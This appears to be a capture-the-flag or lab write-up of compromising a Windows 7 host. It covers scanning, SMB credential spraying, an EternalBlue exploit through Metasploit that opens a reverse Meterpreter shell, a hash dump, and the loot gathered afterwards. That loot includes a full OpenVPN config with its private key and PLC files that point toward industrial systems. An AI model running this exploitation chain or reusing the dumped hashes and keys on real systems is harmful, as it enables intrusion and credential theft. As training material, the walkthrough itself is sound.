As usual I will start by checking for all the alive services over all the TCP protocol:

```bash
PORT      STATE SERVICE      REASON         VERSION
135/tcp   open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 64 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: ALCHEMY)
49152/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 64 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): Google Fuchsia (87%), IBM z/OS 1.12.X (85%)
OS CPE: cpe:/o:google:fuchsia cpe:/o:ibm:zos:1.12
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Google Fuchsia (87%), IBM z/OS 1.12 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=4/21%OT=135%CT=%CU=%PV=Y%G=N%TM=69E7315C%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=RD%II=RI%TS=A)
SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=RD%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 30.471 days (since Sat Mar 21 21:54:06 2026)
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: Host: EW; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39641/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 6464/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21745/udp): CLEAN (Timeout)
|   Check 4 (port 15321/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: EW
|   NetBIOS computer name: EW\x00
|   Workgroup: ALCHEMY\x00
|_  System time: 2026-04-21T09:12:02+01:00
| smb2-time: 
|   date: 2026-04-21T08:12:05
|_  start_date: 2026-04-21T02:10:40

```

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 172.17.0.34:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.17.0.34:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 172.17.0.34:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.17.0.34:445 - The target is vulnerable.
[*] 172.17.0.34:445 - Connecting to target for exploitation.
[+] 172.17.0.34:445 - Connection established for exploitation.
[+] 172.17.0.34:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.17.0.34:445 - CORE raw buffer dump (42 bytes)
[*] 172.17.0.34:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.17.0.34:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.17.0.34:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.17.0.34:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.17.0.34:445 - Trying exploit with 12 Groom Allocations.
[*] 172.17.0.34:445 - Sending all but last fragment of exploit packet
[*] 172.17.0.34:445 - Starting non-paged pool grooming
[+] 172.17.0.34:445 - Sending SMBv2 buffers
[+] 172.17.0.34:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.17.0.34:445 - Sending final SMBv2 buffers.
[*] 172.17.0.34:445 - Sending last fragment of exploit packet!
[*] 172.17.0.34:445 - Receiving response from exploit packet
[+] 172.17.0.34:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.17.0.34:445 - Sending egg to corrupted connection.
[*] 172.17.0.34:445 - Triggering free of corrupted buffer.
[*] Sending stage (248902 bytes) to 10.10.110.1
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.110.1:48499) at 2026-04-21 14:31:19 +0200
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo 
Computer        : EW
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : ALCHEMY
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 

```

# SMB

Now I find myself in a bad spot as I have no valid credentials to any machine so far, but I see that this machine is runnign an "ancient" windows 7 and It might just be vulknerable to Enthernal blue?

```bash
netexec smb 172.17.0.0/24                                               
SMB         172.17.0.34     445    EW               [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:EW) (domain:EW) (signing:False) (SMBv1:True) (Null Auth:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                       
```

I can also see a readable custom share?

```bash
$ netexec smb 172.17.0.34 -u users_linux.txt -p passwords_linux.txt 
SMB         172.17.0.34     445    EW               [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:EW) (domain:EW) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.17.0.34     445    EW               [+] EW\calde_ldap:CsAdlLDAPMoDeBrnd12! (Guest)
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Alchemy]
└─$ netexec smb 172.17.0.34 -u users_linux.txt -p passwords_linux.txt --shares
SMB         172.17.0.34     445    EW               [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:EW) (domain:EW) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.17.0.34     445    EW               [+] EW\calde_ldap:CsAdlLDAPMoDeBrnd12! (Guest)
SMB         172.17.0.34     445    EW               [*] Enumerated shares
SMB         172.17.0.34     445    EW               Share           Permissions     Remark
SMB         172.17.0.34     445    EW               -----           -----------     ------
SMB         172.17.0.34     445    EW               ADMIN$                          Remote Admin
SMB         172.17.0.34     445    EW               C$                              Default share
SMB         172.17.0.34     445    EW               IPC$                            Remote IPC
SMB         172.17.0.34     445    EW               Share           READ            

```

But the share is empty which means i need to fire metasploit for the "big guns":

```bash
 impacket-smbclient calde_ldap:'CsAdlLDAPMoDeBrnd12!'@172.17.0.34
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Sharwe
[-] SMB SessionError: code: 0xc00000cc - STATUS_BAD_NETWORK_NAME - {Network Name Not Found} The specified share name cannot be found on the remote server.
# use Share
# ls
drw-rw-rw-          0  Fri Jul 21 08:44:22 2017 .
drw-rw-rw-          0  Fri Jul 21 08:44:22 2017 ..
# 

```

And the user list confims the presence of no other users:

```bash
netexec smb 172.17.0.34 -u calde_ldap -p CsAdlLDAPMoDeBrnd12! --rid-brute     
SMB         172.17.0.34     445    EW               [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:EW) (domain:EW) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         172.17.0.34     445    EW               [+] EW\calde_ldap:CsAdlLDAPMoDeBrnd12! (Guest)
SMB         172.17.0.34     445    EW               500: EW\Administrator (SidTypeUser)
SMB         172.17.0.34     445    EW               501: EW\Guest (SidTypeUser)
SMB         172.17.0.34     445    EW               513: EW\None (SidTypeGroup)

```

And now I have the keys to the system:

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 172.17.0.34:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.17.0.34:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 172.17.0.34:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.17.0.34:445 - The target is vulnerable.
[*] 172.17.0.34:445 - Connecting to target for exploitation.
[+] 172.17.0.34:445 - Connection established for exploitation.
[+] 172.17.0.34:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.17.0.34:445 - CORE raw buffer dump (42 bytes)
[*] 172.17.0.34:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.17.0.34:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.17.0.34:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.17.0.34:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.17.0.34:445 - Trying exploit with 12 Groom Allocations.
[*] 172.17.0.34:445 - Sending all but last fragment of exploit packet
[*] 172.17.0.34:445 - Starting non-paged pool grooming
[+] 172.17.0.34:445 - Sending SMBv2 buffers
[+] 172.17.0.34:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.17.0.34:445 - Sending final SMBv2 buffers.
[*] 172.17.0.34:445 - Sending last fragment of exploit packet!
[*] 172.17.0.34:445 - Receiving response from exploit packet
[+] 172.17.0.34:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.17.0.34:445 - Sending egg to corrupted connection.
[*] 172.17.0.34:445 - Triggering free of corrupted buffer.
[-] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 172.17.0.34:445 - Connecting to target for exploitation.
[+] 172.17.0.34:445 - Connection established for exploitation.
[+] 172.17.0.34:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.17.0.34:445 - CORE raw buffer dump (42 bytes)
[*] 172.17.0.34:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.17.0.34:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.17.0.34:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.17.0.34:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.17.0.34:445 - Trying exploit with 17 Groom Allocations.
[*] 172.17.0.34:445 - Sending all but last fragment of exploit packet
[*] 172.17.0.34:445 - Starting non-paged pool grooming
[+] 172.17.0.34:445 - Sending SMBv2 buffers
[*] Sending stage (248902 bytes) to 10.10.110.1
[+] 172.17.0.34:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.17.0.34:445 - Sending final SMBv2 buffers.
[*] 172.17.0.34:445 - Sending last fragment of exploit packet!
[*] 172.17.0.34:445 - Receiving response from exploit packet
[+] 172.17.0.34:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.17.0.34:445 - Sending egg to corrupted connection.
[*] 172.17.0.34:445 - Triggering free of corrupted buffer.
[*] Sending stage (248902 bytes) to 10.10.110.1
[*] Meterpreter session 2 opened (10.10.14.15:4444 -> 10.10.110.1:58832) at 2026-04-21 14:36:35 +0200
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.17.0.34:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > [*] Meterpreter session 3 opened (10.10.14.15:4444 -> 10.10.110.1:51026) at 2026-04-21 14:36:41 +0200



meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2a572c5e5ffe107ca30f260b97843d94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
yovecio:1001:aad3b435b51404eeaad3b435b51404ee:a5bcd209fb3d31376955f8a129f55bfa:::
meterpreter > 


```

# Post Exploitation

Now I can login with the hashes obtained by the hashdump and get another flag:

```bash
C:\Users\Administrator\Desktop> type flag.txt
ALCHEMY{0u7d473d_50f7w423_3v32ywh323}

C:\Users\Administrator\Desktop> 


```

Now this is having some inputs about the possible access to the new subnet?

```bash
\Users\Administrator\Desktop> type TODO.txt
1. Updating to the latest version of OpenPLC Editor broke the application due to compatibility issues with Windows 7. Revert back to an older version.

2. Update the conditioning (aging) PLC logic in the Git repository if we plan to maintain the hotfix for an extended period.
C:\Users\Administrator\Desktop> 


```

There is a openvpn client that might be usable on the machine 10.10.110.100 since that had the open port for the OPENVPN:

```bash
cat client.ovpn
client
nobind
dev tun
remote-cert-tls server
remote 10.10.110.100 1194 tcp
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDglYitHXn1VnDu
5vbhZhmj6bl3LfNIg9HlMd+KXXftp7JtpA2M2LmWqclKEPDO6zc8n2Cs0UYddzLE
RdWOb/lyHE3rAnapT4QgKon3FqajgC6Em44oBn608a400moMQGoFyTxTzZ/gIUWu
ImPQAWL8rZyMlvm50QLSB1UXEPOSGz7G8kp8iwAgWZuYUf+B3ETteKMhPPcwR94f
bwJZsjG11feCekXfgDiZcFRWkrzasqkoeowEd+b/rXWr4vVvVakJdmhbpobK2HVt
4I/imBiRr0gB2E1S/T+19lLp+nPaDEZ6Hi+EM5DoM6jIW5WYpPEZ5FIdymwlmhkK
sAGk/2rVAgMBAAECggEAX+H3tFE9XG1HUffxt1Gr6LtEn4lSsMb2ue+NDLnTFffe
ycicsGFm+tgKREDvTqhFsPAqih3e3X2igwF9p45O5VUIPymSF78HHeSLep6FDpEP
SzZOfvAm8IGuaobbF9f4a/f6dZz4gOwzn6C3FHtDE7XbfHqIq7h8h8bxoSNvmhSS
9fNggcCFpeA8O36YVaQtHSSXPM/xXCYk+NSdUP/OA0tQTdPXJZ7ShoAp3OeMV5Ar
/gl5N5xS9Np+WmYgGIRRlaHA6TE0IGS6Qk2FgCA2F5+QwoTi/ru7BU+X86Vc0KB2
Duikvv5qQAj16BinubT+F2wtS2kjG9SRjZHvUYI5kQKBgQD0OCREpG9ytDpWoB6c
TFyC2JzkYohzQ8qY5Ybugy5JkEF45kDWJ9LdhAWRagqeE8esY/T/YHuG0Cy0cHbF
NCfD4J6EayshXTZA8Z0F5e44HoE3xTZWeqzlXS5f190fk4vuwAN11TPpQxYwZlkg
Sy1rDT7HJIARZqCy1UEoT0qGQwKBgQDraury8xIUQzBXWA98pGKQjYqkMujwlMT9
zBAPGiMm4h5cfaoAaTGnmNnU65E4u5rFAmUOvCmo96RMXi+YusqM1O5f563jh2P3
Aqbwl2tGTW7DsTeryW4p9I2Ql/n4w2Ws0nQi56jMJZ3M1yKOUFCfTETh0tc7aNzz
RdVZwsDVBwKBgQC/FJIj9viQKb2fe4aXyhNz+SHAe+vBK+B/gs7xHUiBHFJt0tIV
/XC6CwsEPJD0IAvRsR/HFGlyEL15rKjxIR6f3saIWwWTBEhnxeOS8tVRqWR3C2G5
hiBzEVYwfUgw5ZPOCQRsFJWaQ/g/hETlxIxTvzhIPiHJ+59ubPafIHLx2wKBgHOR
2GeOdoil91xZqbipxo1qPu6e44X/srlZbWTMkwcqqHcFZeivu6WoPv/s6SztxGwE
4fGa4+TENc8bycfzoy4B9kf0p4P0WlnP3n5sB0jLCJ5fKJJX35IPMVQTl67M1eRC
qKreCRq3OMFvt9IfkYSyX3pxFCJhN17iIHvhROMPAoGBANR6Oea/0HXu3sTrUQ8t
tdZ+DAI4h1iTpe/wROL6rfHDDPaxfPtXF7TOiMtprVAdU3SKLSQzUobVxelQpgv/
eiIuYHb6O2OzM+G6Ez2d9MwJg9q7LW+8tPpSBs3b8oVZZtybV8kzeFXytPzFi7fq
wKSYarcYMnX7ykDyEOoLZnj6
-----END PRIVATE KEY-----
</key>
<cert>
-----BEGIN CERTIFICATE-----
MIIDRDCCAiygAwIBAgIRANX1c+P9a0qa8I900REWg44wDQYJKoZIhvcNAQELBQAw
DTELMAkGA1UEAwwCT1QwHhcNMjQwMTIwMTkyMDE1WhcNMjYwNDI0MTkyMDE1WjAS
MRAwDgYDVQQDDAdhcXVpbmFzMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
AQEA4JWIrR159VZw7ub24WYZo+m5dy3zSIPR5THfil137aeybaQNjNi5lqnJShDw
zus3PJ9grNFGHXcyxEXVjm/5chxN6wJ2qU+EICqJ9xamo4AuhJuOKAZ+tPGuNNJq
DEBqBck8U82f4CFFriJj0AFi/K2cjJb5udEC0gdVFxDzkhs+xvJKfIsAIFmbmFH/
gdxE7XijITz3MEfeH28CWbIxtdX3gnpF34A4mXBUVpK82rKpKHqMBHfm/611q+L1
b1WpCXZoW6aGyth1beCP4pgYka9IAdhNUv0/tfZS6fpz2gxGeh4vhDOQ6DOoyFuV
mKTxGeRSHcpsJZoZCrABpP9q1QIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0O
BBYEFLJ9E1FoSm9OPVb9q3bpvik7i129MEgGA1UdIwRBMD+AFE/6pGtxQE5CjpgU
CgmSnpB86Sx4oRGkDzANMQswCQYDVQQDDAJPVIIUO0VQTj5kyDHG0BurXVDNkzMH
Ny4wEwYDVR0lBAwwCgYIKwYBBQUHAwIwCwYDVR0PBAQDAgeAMA0GCSqGSIb3DQEB
CwUAA4IBAQBT5OWhl9lWUash+NGRFOWezyF6Rgk/UC5NSZrSzRsfxPpp6Go6b8Hz
WNMjsVtwVci0t4JJGpc4S+tGaVOyFsMu2qXRcTVpizHdA91EwJij3dKW4GcFm+bT
At+5VQZ+5aKfCpRuFKPxznYRQoFYaWofnLoREcFQAEAwTwy7vP1TDTR+hzOnWIMl
izbuGB70oTMaOxpsXq2DdydkMDsKfO1DXteDZJGlM5ZwdUeqf5WSCdIiISrLy8Lt
F19DHvV56pSwZfWBPRblK3A/iZFyr6aDmDErUyCYo8NBMHLOoB+rTHkm6f4ybC3q
Pb2roBdatLEB0etfJmtupcqLXZnAHk0O
-----END CERTIFICATE-----
</cert>
<ca>
-----BEGIN CERTIFICATE-----
MIIDMDCCAhigAwIBAgIUO0VQTj5kyDHG0BurXVDNkzMHNy4wDQYJKoZIhvcNAQEL
BQAwDTELMAkGA1UEAwwCT1QwHhcNMjQwMTIwMTkxNjA4WhcNMzQwMTE3MTkxNjA4
WjANMQswCQYDVQQDDAJPVDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AMgv1/jdPv6G7tMvQdVgd8AhYNO+3KbsB8dqtfEJZOjdEiq55noMkXSx8OXbvOFG
CH03C/wYAd1o8K8XrtbCP5KfshbbTFq5cAtlXlqJ74jHNhmjDUjUCX09x745YjU+
KWFDV1tXu33ApIfYN1H3Dtv/s4Kq+vX88bdkCiBcIpNBUythWD7Z75bwFYndB8jX
J1eEOa0ZFKkc4sHqfo61+VnqrBHwR73SvJxvyO0OIXLYJP3Woyc/0SxSGGIaMPKG
wJMQkHW48vXbE54FR2eeoc9GEsijTk2uR6UVmAadIDqQGC0APFdnVyb3YLeAz+ac
I5vQQUVQu98IUh60cuuJTw8CAwEAAaOBhzCBhDAdBgNVHQ4EFgQUT/qka3FATkKO
mBQKCZKekHzpLHgwSAYDVR0jBEEwP4AUT/qka3FATkKOmBQKCZKekHzpLHihEaQP
MA0xCzAJBgNVBAMMAk9UghQ7RVBOPmTIMcbQG6tdUM2TMwc3LjAMBgNVHRMEBTAD
AQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG9w0BAQsFAAOCAQEAcPR2Rmau5BJhEwRp
ODGTjpr8LAegTyUzSdFpTx9YIfnt2ifuMBmq5JeUeNBSZ0Zv1KxSFVmFdM248g1v
Zoi5UBtHMJ13XkVZMuRW0IPpwo0FlJJxwvioCcbhTG9lvzzGO1hl+26IfWVGsQRB
5IoBWmYkmC2feiSOhVUxvT8oxYfRYEQOOAT0RCVt3ddwpco9zRZXhHSNhR27xAed
S/E4DtIk/h2nGWj7qRfMgKOAqI0ycd1Q/REwlyzzq54l3yTG2jhsSV4kBnJM4jFZ
RNkeo4NikMF+PSprZtDH1vAR2Ue4rnSTVahWy33VdxaCL0IZL7v68YQDiYdmUpSV
EAjPQA==
-----END CERTIFICATE-----
</ca>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
dc0841d8d1424d05d44e68f375ed52bf
7a717b95cf10945de4759e424ec8ee2b
1a7c52bb53bae92f7ae7fc33736efe2a
398f31a067f3e4dfcaccf43348ef37eb
6663e4a16b852d3ea9ce2b763556ffd6
0c204847b0c2f56c38d151a10c22f658
8871566205d8d20aee1fd3dafa8eed36
f9a1b677d30f0395103cd980943bdec9
7a1ed0bca81b6f4508ba5db581d86f04
18a3838e2515419a1b15ab3dc2b231da
ac42080ece2b097482c505104bc7046b
6471caadf5b15a3d0d8c268df8c3a6f8
3ecd9efd42678991f6779b50dc678ae5
ed3daadc7d64d2d3d08172bf070e647c
1605ec1075e88bd4528bc60f6b495a86
a59bcb7f14160a57d5525b886f8483f7
-----END OpenVPN Static key V1-----
</tls-auth>
route 172.19.0.0 255.255.0.0
#redirect-gateway def1

```

The network captures has possibly some credentials in a pcap file to be parsed in wireshark?

```bash
# cd Network_Captures
# ls
drw-rw-rw-          0  Tue Feb 13 13:27:37 2024 .
drw-rw-rw-          0  Tue Feb 13 13:27:37 2024 ..
-rw-rw-rw-     256320  Fri Apr 19 19:21:41 2024 lautering_password_check.pcap
# get lautering_password_check.pcap
# 


```

getting some more files:

```bash
/Users/Administrator/Desktop/conditioning_logic_update
# ls
drw-rw-rw-          0  Wed Apr 10 15:17:38 2024 .
drw-rw-rw-          0  Wed Apr 10 15:17:38 2024 ..
-rw-rw-rw-        157  Fri Apr 19 19:21:41 2024 beremiz.xml
-rw-rw-rw-      92395  Fri Apr 19 19:21:42 2024 plc.xml
# get beremiz.xml
# get plc.xml
# 

```

Lastly. there are some pdf of PLC documentations?

```bash
# tree .
/Users/Administrator/Desktop/PLC_Documentation/AutomateX/AutomateX_HMI_QUICK_START.pdf
/Users/Administrator/Desktop/PLC_Documentation/AutomateX/AutomateX_PLC_DATASHEET.pdf
/Users/Administrator/Desktop/PLC_Documentation/AutomateX/AutomateX_RELEASE_NOTES.pdf
/Users/Administrator/Desktop/PLC_Documentation/OmniPLC/OmniPLC_DATASHEET.pdf
/Users/Administrator/Desktop/PLC_Documentation/OmniPLC/OmniPLC_HMI_QUICK_START.pdf
/Users/Administrator/Desktop/PLC_Documentation/OmniPLC/OmniPLC_RELEASE_NOTES.pdf
/Users/Administrator/Desktop/PLC_Documentation/SimplePLC/SimplePLC_DATASHEET.pdf
/Users/Administrator/Desktop/PLC_Documentation/SimplePLC/SimplePLC_HMI_QUICK_START.pdf
/Users/Administrator/Desktop/PLC_Documentation/SimplePLC/SimplePLC_RELEASE_NOTES.pdf
Finished - 12 files and folders
# 


```